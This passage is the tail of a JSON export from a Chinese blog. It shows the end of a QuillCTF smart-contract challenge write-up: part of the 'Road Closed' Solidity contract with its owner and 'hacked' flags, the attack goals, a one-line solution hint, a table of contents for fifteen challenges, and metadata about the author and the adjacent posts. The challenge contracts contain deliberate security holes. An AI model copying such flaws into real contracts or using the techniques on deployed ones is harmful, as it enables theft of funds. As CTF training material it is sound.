class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> addr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"address must be msg.sender\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must be owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hacked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> pwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hacked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isHacked</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> hacked<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li><strong>Become the owner of the contract</strong></li>\n<li><strong>Change the value of hacked to true</strong></li>\n</ol>\n<h2 id=\"Analyse-14\"><a href=\"#Analyse-14\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230204220431060.png\" style=\"zoom:50%;\" />\n\n<p>按顺序调用下来</p>\n","text":"QuillCTF看到Quill在弄的区块链安全CTF题目，看到完成奖励很是心动 只是可惜，发现这个挑战时候已经结束了五道题，只剩下三道题目，不过看起来应该还在更新之中，本着挑战一下的心态还是来试一试吧 0x10 PseudoRandomCode// SPDX-License-Id...","link":"","photos":[],"count_time":{"symbolsCount":"48k","symbolsTime":"44 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":20,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#QuillCTF\"><span class=\"toc-text\">QuillCTF</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x10-PseudoRandom\"><span class=\"toc-text\">0x10 PseudoRandom</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse\"><span class=\"toc-text\">Analyse</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0F-SlotPuzzle\"><span class=\"toc-text\">0x0F SlotPuzzle</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-1\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0E-Molochs-Vault\"><span class=\"toc-text\">0x0E Molochs Vault</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-1\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-2\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-1\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0D-Donate\"><span class=\"toc-text\">0x0D Donate</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-2\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyes\"><span class=\"toc-text\">Analyes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-2\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0C-WETH11\"><span class=\"toc-text\">0x0C WETH11</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-3\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-3\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-3\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0B-Panda-Token\"><span class=\"toc-text\">0x0B Panda Token</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-4\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-4\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-4\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x0A-Gate\"><span class=\"toc-text\">0x0A Gate</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-5\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-5\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-5\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x09-WETH10\"><span class=\"toc-text\">0x09 WETH10</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-6\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-6\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-6\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x08-Pelusa\"><span class=\"toc-text\">0x08 Pelusa</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-7\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-7\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-7\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x07-True-XOR\"><span class=\"toc-text\">0x07 True XOR</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-8\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-8\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-8\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x06-Collatz-Puzzle\"><span class=\"toc-text\">0x06 Collatz Puzzle</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-9\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-9\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-9\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x05-D31eg4t3\"><span class=\"toc-text\">0x05 D31eg4t3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-10\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-10\"><span class=\"toc-text\">Analyse</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x04-safeNFT\"><span class=\"toc-text\">0x04 safeNFT</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-11\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-11\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-10\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03-VIP-Bank\"><span class=\"toc-text\">0x03 VIP Bank</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-12\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-12\"><span class=\"toc-text\">Analyse</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x02-Confidential-Hash\"><span class=\"toc-text\">0x02 Confidential Hash</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-13\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-13\"><span class=\"toc-text\">Analyse</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01-Road-Closed\"><span class=\"toc-text\">0x01 Road Closed</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-14\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-14\"><span class=\"toc-text\">Analyse</span></a></li></ol></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"VNCTF2023","uid":"7b3ace99200e1da5abf0dd22cabd2b45","slug":"VNCTF2023","date":"2023-02-26T17:45:43.913Z","updated":"2023-03-03T03:16:08.503Z","comments":true,"path":"api/articles/VNCTF2023.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221216152229811.png","text":"0x01 SignInCodepragma solidity 0.4.23; contract Checkin &#123; string public welcomeMessage ; uint16 public year ; constructor ( string _mss...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":13,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Priority Gas Auctions (PGAs)","uid":"ac4aeeb950031db089d1689b68bf4df9","slug":"Priority-Gas-Auctions-(PGAs)","date":"2023-01-03T16:27:44.588Z","updated":"2023-04-25T12:22:40.288Z","comments":true,"path":"api/articles/Priority-Gas-Auctions-(PGAs).json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/20201017172017.png","text":"0x01 前提我们都知道，常规意义上，在以太坊上提交交易是一个有序的过程，现在重新审视一下这个过程： 用户需要在钱包构建交易，并签名，钱包后端会将该交易广播到 P2P 网络； 该交易首先会进入各个节点的 mempool，按照一定的顺序排列； 矿工从 mempool 中选取合适的交...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":13,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/202311061840946.gif","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}